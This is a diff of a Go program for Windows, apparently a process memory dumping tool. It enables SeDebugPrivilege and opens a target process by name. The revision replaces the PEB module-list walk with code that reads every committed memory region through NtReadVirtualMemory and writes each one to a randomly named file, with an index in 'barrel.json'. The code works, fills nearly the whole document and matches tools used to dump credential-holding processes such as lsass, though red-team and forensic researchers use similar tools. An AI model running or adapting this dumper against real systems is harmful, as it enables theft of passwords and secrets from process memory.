@@ -7,9 +7,9 @@ import (
 	"unsafe"
 	"strings"
 	"syscall"
-	"strconv"
+    "math/big"
+	"crypto/rand"
 	"unicode/utf8"
-	"unicode/utf16"
 	"encoding/json"
 	"golang.org/x/sys/windows"
 )
@@ -21,17 +21,10 @@ const (
 	SE_PRIVILEGE_ENABLED = 0x00000002
 	TOKEN_ADJUST_PRIVILEGES = 0x0020
 	TOKEN_QUERY = 0x0008
-	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
 	ProcessBasicInformation uintptr = 0x00
-	ProcessQueryInformation uintptr = 0x0400
-	ProcessVmRead uintptr = 0x0010
 	PAGE_NOACCESS uint32 = 0x01
 	MEM_COMMIT uint32 = 0x00001000
-	ldr_offset uintptr = 0x18
-	inInitializationOrderModuleList_offset uintptr = 0x30
-	flink_dllbase_offset uintptr = 0x20
-	flink_buffer_offset uintptr = 0x50
-	flink_buffer_fulldllname_offset uintptr = 0x40
+	letters = "abcdefghijklmnopqrstuvwxyz"
 )
 
 var (
@@ -96,11 +89,10 @@ type MEMORY_BASIC_INFORMATION struct {
 	Type              uint32
 }
 
-type ModuleInformation struct {
+type Mem64Information struct {
 	Field0	string `json:"field0"`
 	Field1	string    `json:"field1"`
-	Field2  string `json:"field2"`
-	Field3  uint32 `json:"field3"`
+	Field2  uint32 `json:"field2"`
 }
 
 
@@ -121,45 +113,6 @@ func init() {
 }
 
 
-func read_remoteintptr(process_handle uintptr, base_address uintptr, size uintptr) uintptr {
-	buffer := make([]byte, size)
-	var bytesRead uintptr
-	status, _, _ := ntReadVirtualMemory.Call(process_handle, base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
-	if status != 0 {
-		fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
-		return 0
-	}
-	read_value := *(*uintptr)(unsafe.Pointer(&buffer[0]))
-	return read_value
-}
-
-
-func utf16BytesToUTF8(utf16Bytes []byte) []byte {
-	u16s := make([]uint16, len(utf16Bytes)/2)
-	for i := range u16s {
-		u16s[i] = uint16(utf16Bytes[i*2]) | uint16(utf16Bytes[i*2+1])<<8
-	}
-	return []byte(string(utf16.Decode(u16s)))
-}
-
-
-func read_remoteWStr(process_handle uintptr, base_address uintptr, size uintptr) string {
-	buffer := make([]byte, size)
-	var bytesRead uintptr
-	status, _, _ := ntReadVirtualMemory.Call(process_handle, base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
-	if status != 0 {
-		fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
-		return ""
-	}
-	for i := 0; i < int(bytesRead)-1; i += 1 {
-		if buffer[i] == 0x00 && buffer[i+1] == 0x00 {
-			return string(utf16BytesToUTF8(buffer[:i+2]))
-		}
-	}
-	return ""
-}
-
-
 func Reverse(s string) string {
 	size := len(s)
 	buf := make([]byte, size)
@@ -170,7 +123,6 @@ func Reverse(s string) string {
 	}
 	return string(buf)
 }
-
 
 func GetProcessByName(process_name string) []uintptr{
 	var proc_handles_slice []uintptr;
@@ -214,7 +166,7 @@ func enable_SeDebugPrivilege() bool {
 	luid := LUID{ LowPart:  20, HighPart: 0,}
 	tp := TOKEN_PRIVILEGES{
 		PrivilegeCount: 1,
-		Privileges: [1]LUID_AND_ATTRIBUTES{ { Luid: luid, Attributes: 0x00000002, }, },
+		Privileges: [1]LUID_AND_ATTRIBUTES{ { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED, }, },
 	}
 
 	// NtAdjustPrivilegesToken
@@ -249,81 +201,6 @@ func open_process(pid uintptr) uintptr {
 }
 
 
-func query_process_information(proc_handle uintptr) ([]ModuleInformation){
-	var dll_base uintptr = 1337
-	var pbi PROCESS_BASIC_INFORMATION
-	var returnLength uint32
-
-	// NtQueryInformationProcess
-	status, _, _ := ntQueryInformationProcess.Call(uintptr(proc_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
-	if status != 0 {
-		fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
-		return nil
-	}
-	peb_addr := pbi.PebBaseAddress 
-	fmt.Printf("[+] PebBaseAddress:\t0x%s\n", fmt.Sprintf("%x", peb_addr))
-
-	ldr_pointer := peb_addr + ldr_offset
-	fmt.Printf("[+] Ldr Pointer:\t0x%s\n", fmt.Sprintf("%x", ldr_pointer))
-
-	ldr_addr := read_remoteintptr(proc_handle, ldr_pointer, 8)
-	fmt.Printf("[+] Ldr Address:\t0x%s\n", fmt.Sprintf("%x", ldr_addr))
-
-	inInitializationOrderModuleList := ldr_addr + inInitializationOrderModuleList_offset
-	next_flink := read_remoteintptr(proc_handle, inInitializationOrderModuleList, 8)
-	fmt.Printf("[+] next_flink: \t0x%s\n", fmt.Sprintf("%x", next_flink))
-
-	moduleinfo_arr := []ModuleInformation{}
-	
-	for (dll_base != 0){
-		next_flink = next_flink - 0x10
-		dll_base = read_remoteintptr(proc_handle, (next_flink + flink_dllbase_offset), 8)
-		if (dll_base == 0){
-			break
-		}
-
-		buffer := read_remoteintptr(proc_handle, (next_flink + flink_buffer_offset), 8)
-		base_dll_name := read_remoteWStr(proc_handle, buffer, 256)
-		
-		buffer = read_remoteintptr(proc_handle, (next_flink + flink_buffer_fulldllname_offset), 8)
-		full_dll_path := read_remoteWStr(proc_handle, buffer, 256)
-		
-		module_info := ModuleInformation{ Field0: base_dll_name, Field1: full_dll_path, Field2: (fmt.Sprintf("%x", dll_base)), Field3: 0}
-		moduleinfo_arr = append(moduleinfo_arr, module_info)
-		next_flink = read_remoteintptr(proc_handle, (next_flink + 0x10), 8)
-	}	
-
-	return moduleinfo_arr
-
-}
-
-
-func find_object(moduleinfo_arr []ModuleInformation, aux_name string) (ModuleInformation){
-	var results []ModuleInformation
-	for i := 0; i < len(moduleinfo_arr); i++ {
-		if moduleinfo_arr[i].Field0 == aux_name {
-			results = append(results, moduleinfo_arr[i])	
-		}
-	}
-	if (len(results) > 0) {
-		return results[0]
-	} else {
-		module_info := ModuleInformation{ Field0: "", Field1: "", Field2: "", Field3: 0}
-		return module_info
-	}
-}
-
-
-func update_module_slice(moduleinfo_arr []ModuleInformation, aux_name string, aux_size int) ([]ModuleInformation){
-	for i := 0; i < len(moduleinfo_arr); i++ {
-		if moduleinfo_arr[i].Field0 == aux_name {
-			moduleinfo_arr[i].Field3 = uint32(aux_size)
-		}
-	}
-	return moduleinfo_arr
-}
-
-
 func get_pid(proc_handle uintptr) uintptr {
 	var pbi PROCESS_BASIC_INFORMATION
 	var returnLength uint32
@@ -334,6 +211,35 @@ func get_pid(proc_handle uintptr) uintptr {
 	}
 	pid := pbi.UniqueProcessID
 	return pid
+}
+
+
+func writeToFile(file_name string, byteArray []byte) () {
+	// Write to binary file
+	file, err := os.OpenFile(file_name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
+	if err != nil {
+		fmt.Printf("Error opening file: %v\n", err)
+		return
+	}
+	defer file.Close()
+	_, err = file.Write(byteArray)
+	if err != nil {
+		fmt.Printf("Error writing to file: %v\n", err)
+		return
+	}
+}
+
+
+func randomString(length int) (string) {
+    result := make([]byte, length)
+    for i := range result {
+        num, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
+        if err != nil {
+            return ""
+        }
+        result[i] = letters[num.Int64()]
+    }
+    return string(result)
 }
 
 
@@ -350,16 +256,20 @@ func main() {
 
 	// Get process handle with correct privilege
 	proc_handle = open_process(pid)
-	fmt.Printf("[+] Process Handle: \t%d\n", proc_handle)
+	fmt.Printf("[+] Process Handle: \t%d\n", proc_handle)	
 	
-	// Get modules information except size
-	moduleinfo_arr := query_process_information(proc_handle)
-	
-	// Get size for each module
 	var mem_address uintptr = 0
 	var proc_max_address_l uintptr = 0x7FFFFFFEFFFF
-	aux_size := 0
-	aux_name := ""
+	// Create directory
+	dirName := randomString(5)
+    err := os.Mkdir(dirName, 0755)
+    if err != nil {
+        fmt.Printf("Error creating directory: %v\n", err)
+        return
+    } 
+    fmt.Printf("[+] Files will be generated at %s\n", dirName)
+    // Slice/Array for Mem64Information objects
+	mem64list_arr := []Mem64Information{}
 	for (mem_address < proc_max_address_l){
 		var memInfo MEMORY_BASIC_INFORMATION
 		var resultLength uintptr
@@ -369,31 +279,30 @@ func main() {
 			return
 		}	
 		if (memInfo.Protect != PAGE_NOACCESS && memInfo.State == MEM_COMMIT){
-			var matching_object ModuleInformation = find_object(moduleinfo_arr, aux_name)
-			matchingObjectUint64, _ := strconv.ParseUint(matching_object.Field2, 0, 64)
-			if (memInfo.RegionSize == 0x1000 && memInfo.BaseAddress != uintptr(matchingObjectUint64)){
-				moduleinfo_arr = update_module_slice(moduleinfo_arr, aux_name, aux_size)
-				for i := 0; i < len(moduleinfo_arr); i++ {
-					auxUint64, _ := strconv.ParseUint(moduleinfo_arr[i].Field2, 16, 64)
-					if memInfo.BaseAddress == uintptr(auxUint64){
-						aux_name = moduleinfo_arr[i].Field0
-						aux_size = int(memInfo.RegionSize)
-					}
-				}
-			} else {
-				aux_size += int(memInfo.RegionSize)
-			}
+			buffer := make([]byte, memInfo.RegionSize)
+			var bytesRead uintptr
+			// if status != 0 it maybe be GuardPage
+			ntReadVirtualMemory.Call(proc_handle, memInfo.BaseAddress, uintptr(unsafe.Pointer(&buffer[0])), memInfo.RegionSize, uintptr(unsafe.Pointer(&bytesRead)))
+			// Random name
+			memdump_filename := randomString(9) + "." + randomString(3) //fmt.Sprintf("%x", (memInfo.BaseAddress))
+			
+			// Write binary file
+			writeToFile((dirName + "\\" + memdump_filename), buffer)
+
+			// Create object and add to slice
+			mem64Info := Mem64Information{ Field0: memdump_filename, Field1: fmt.Sprintf("0x%x", (memInfo.BaseAddress)), Field2: uint32(memInfo.RegionSize)}
+			mem64list_arr = append(mem64list_arr, mem64Info)
 		}
 		mem_address += memInfo.RegionSize
 	}
 
 	// Write to file
-	jsonData, err := json.Marshal(moduleinfo_arr)
+	jsonData, err := json.Marshal(mem64list_arr)
 	if err != nil {
 		fmt.Printf("Error marshaling to JSON: %v\n", err)
 		return
 	}
-	file, err := os.Create("shock.json")
+	file, err := os.Create("barrel.json")
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -404,5 +313,5 @@ func main() {
 		fmt.Println(err)
 		return
 	}
-	fmt.Println("[+] File shock.json generated.")
+	fmt.Println("[+] File barrel.json generated.")
 }
